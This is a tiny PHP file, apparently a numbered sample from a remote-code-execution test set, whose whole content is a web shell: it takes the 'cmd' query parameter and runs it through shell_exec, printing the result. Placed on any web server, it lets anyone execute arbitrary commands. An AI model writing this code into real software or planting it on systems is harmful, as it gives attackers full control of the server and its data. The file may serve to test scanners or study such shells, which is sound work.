<?php
// RCE test variation #1341
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>